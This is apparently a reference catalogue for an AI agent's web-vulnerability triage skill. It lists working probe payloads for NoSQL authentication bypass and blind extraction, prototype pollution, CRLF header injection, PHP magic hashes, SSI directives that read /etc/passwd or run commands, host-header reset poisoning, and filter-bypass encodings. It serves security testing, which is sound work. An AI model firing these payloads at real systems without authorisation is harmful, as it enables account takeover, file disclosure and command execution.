# Signal-to-class probe catalogue — Open WHEN: a triage discriminator in SKILL.md points here for the full per-class probe list, encoding ladder, or fingerprint table

This is the overflow catalogue for the bug-identification triage
skill. The SKILL.md body holds the one-probe discriminators; this
file holds the longer probe lists you reach for only after the
cheap discriminator says "keep going". Stay in triage mode: these
are read-only confirmation probes, not exploitation. Once a class
is confirmed, emit the finding and hand off to the named specialist.

---

## NoSQL injection (MongoDB-style operator injection)

Suspect on JSON APIs / Node backends, or when `$` operators or
`CastError`/`MongoError` strings leak into responses.

### Operator reference

| Operator | Meaning            | Use in triage                  |
| -------- | ------------------ | ------------------------------ |
| `$ne`    | not equal          | auth bypass, "match anything"  |
| `$gt`    | greater than       | match-everything oracle        |
| `$lt`    | lower than         | match-everything oracle        |
| `$regex` | regular expression | length + value extraction      |
| `$nin`   | not in             | exclude known values           |
| `$in`    | in                 | guess from a candidate list    |
| `$where` | JS predicate       | high-risk; flag, do not run JS |

### Authentication-bypass probes (URL-encoded form)

```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

### Authentication-bypass probes (JSON body)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### Boolean / result-set discriminator

A `$gt`/`$ne` that returns *more* rows than a normal value, while
`$eq:<junk>` returns *none*, confirms operator injection. This is
the cheapest yes/no — do it before any extraction.

### `$regex` length extraction (blind oracle)

Response shape differs only when the regex matches, revealing the
field length, then character-by-character content. Hand the
extraction itself to the specialist; in triage, one matching vs
one non-matching probe is enough to confirm.

```
username[$ne]=toto&password[$regex]=.{1}     # true when length >= 1
username[$ne]=toto&password[$regex]=.{20}    # narrow the length
username[$ne]=toto&password[$regex]=^m       # first char is m?
username[$ne]=toto&password[$regex]=^md      # ...then d?
```

JSON form of the same:

```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username":{"$in":["admin","root","administrator"]},"password":{"$gt":""}}
```

Hand off to the SQL/NoSQL injection test skill with: endpoint,
parameter, body format (form vs JSON), and which oracle worked.

---

## Prototype pollution (Node / Express)

Suspect on JSON endpoints, especially when a *later, unrelated*
response field changes for no logical reason. The probes below
mutate global object defaults with a harmless, observable side
effect — pick the one whose effect you can see in the response.

### Low-risk detection gadgets (Express)

| Probe (in a JSON body the app parses)             | Confirmed when…                                   |
| ------------------------------------------------- | -------------------------------------------------- |
| `{"__proto__":{"json spaces":10}}`                | a later JSON response is now indented              |
| `{"__proto__":{"status":510}}`                    | the response status code flips to 510              |
| `{"__proto__":{"exposedHeaders":["x"]}}`          | `Access-Control-Expose-Headers` appears            |
| `{"__proto__":{"parameterLimit":1}}` + 2 params   | only the first GET param is reflected              |
| `{"__proto__":{"ignoreQueryPrefix":true}}` + `??x=1` | the `??`-prefixed query is parsed                |

If `__proto__` is filtered, pollute via the `constructor` chain:

```json
{"constructor":{"prototype":{"json spaces":10}}}
```

URL-based variants seen in the wild (for client-side pollution):

```
https://victim/#a=b&__proto__[admin]=1
https://victim/#__proto__[onerror]=alert(1)&__proto__[src]=image
https://victim/?a[constructor][prototype][foo]=bar
```

Triage stops at "a benign property leaked into unrelated output".
Hand off to the deserialisation / injection specialist for gadget
chaining.

---

## CRLF injection / response splitting

Suspect when input is reflected into a *response header*
(`Location`, `Set-Cookie`) rather than the body.

### Confirmation probe

```
?param=value%0d%0aX-Probe:%201
```

Confirmed when a literal `X-Probe: 1` header appears in the
response, or a second `Set-Cookie` / blank-line-then-body appears.

Force a redirect (chains to open-redirect):

```
%0d%0aLocation:%20http://example-collaborator
```

### Filter-bypass: UTF-8 overlong → newline

When raw `%0d`/`%0a` is stripped, some stacks (notably Firefox
cookie handling and certain proxies) down-convert these UTF-8
characters to control bytes:

| UTF-8 char | URL-encoded   | Down-converts to |
| ---------- | ------------- | ---------------- |
| `嘊`       | `%E5%98%8A`   | `%0A` (`\n`)     |
| `嘍`       | `%E5%98%8D`   | `%0D` (`\r`)     |
| `嘾`       | `%E5%98%BE`   | `%3E` (`>`)      |
| `嘼`       | `%E5%98%BC`   | `%3C` (`<`)      |

If the overlong form gets through where the raw byte did not, the
input reaches a layer that decodes after the filter — note that
fingerprint in the finding. Hand off to the header-injection /
open-redirect specialist.

---

## Type juggling (PHP loose comparison)

Suspect when a PHP app compares a user-supplied token, HMAC, or
password hash and the code path looks like loose `==` / `!=`.

### Loose-comparison true statements (a subset)

| Statement                  | Result |
| -------------------------- | ------ |
| `'123' == 123`             | true   |
| `'123abc' == 123`          | true   |
| `'abc' == 0`               | true   |
| `'' == 0 == false == NULL` | true   |
| `'0e123' == '0e456'`       | true   |
| `md5([])` / `sha1([])`     | NULL   |

The `'0e…' == '0e…'` case is the engine of the **magic hash**
class: any hash string of the form `0e` followed only by digits is
read as scientific notation `0`, so two such hashes compare equal.

### Magic-hash probe values

If a value is compared (loosely) to `md5(input)` or `sha1(input)`,
submitting one of these inputs makes the hash start `0e<digits>`,
which equals `0` and any other magic hash:

| Algorithm | Input string  | Resulting hash (starts `0e`)         |
| --------- | ------------- | ------------------------------------ |
| MD5       | `240610708`   | `0e462097431906509019562988736854`   |
| MD5       | `QNKCDZO`     | `0e830400451993494058024219903391`   |
| SHA-1     | `10932435112` | `0e07766915004133176347055865026311…`|

Array trick: where a hash function is applied to a parameter,
sending `param[]=` makes `md5`/`sha1` return `NULL`, which can
satisfy a `!=`-based check. Hand off to the auth-bypass /
business-logic specialist.

---

## Server-Side Includes (SSI) injection

Suspect on classic Apache/nginx-served `.shtml` pages, or anywhere
user input lands in a server-parsed HTML page.

| Directive                         | Confirmed when…                       |
| --------------------------------- | -------------------------------------- |
| `<!--#echo var="DATE_LOCAL" -->`  | the current server date renders         |
| `<!--#printenv -->`               | environment variables render            |
| `<!--#include file="/etc/passwd"-->` | file contents render (also → LFI)    |
| `<!--#exec cmd="id" -->`          | command output renders (also → RCE)     |

If `<!--#echo ...-->` renders but `#exec` is disabled, it is still
SSI injection — note the reduced impact. Edge-Side-Includes (ESI)
in front-of-app caches use `<esi:include src="..."/>`; the same
"directive gets evaluated" oracle applies. Hand off to the
command-injection / SSTI specialist.

---

## CSV / formula injection (low severity — log only)

Suspect when the app lets you put text into a field that is later
exported to CSV/XLSX and opened in a spreadsheet. A cell whose
value begins with `=`, `+`, `-`, or `@` is treated as a formula by
the spreadsheet client, not the web app. This is a
client-side-execution issue with no server impact; record it as a
low-severity finding and move on. Do not construct command-spawning
formulas — confirming that a leading `=` survives export is enough.

---

## Host-header injection

Suspect when generated links (password-reset URLs, absolute
redirects, cache keys) appear to be built from the request's
`Host` header.

1. Send the request with `Host: example-collaborator` (or add
   `X-Forwarded-Host: example-collaborator`).
2. If a generated link, reset URL, or redirect now points at that
   value, host-header injection is confirmed. The highest-value
   case is password-reset poisoning, where the reset link is
   emailed to the victim pointing at the injected host.
3. Hand off to the open-redirect / business-logic specialist.

---

## Encoding ladder (re-encode before ruling a class out)

When a probe is blocked, climb this ladder before concluding the
class is absent. Which rung gets through fingerprints the decoding
layer:

1. Raw character (`../`, `'`, `<`, `\r\n`).
2. Single URL-encode (`..%2f`, `%27`, `%3c`, `%0d%0a`).
3. Double URL-encode (`..%252f`, `%2527`) — defeats a filter that
   decodes once then a sink that decodes again.
4. Overlong / Unicode (`%c0%af` for `/`, the UTF-8 newline chars
   above) — defeats naive byte-match filters.
5. Mixed-case / null-byte (`%00`) where a parser truncates or a
   case-sensitive blocklist is in play.

The rung that works tells you the order of normalisation vs sink,
which often disambiguates two candidate classes (e.g. path
traversal at the filesystem vs at the web server). Record the
working encoding in the finding so the specialist starts from it.
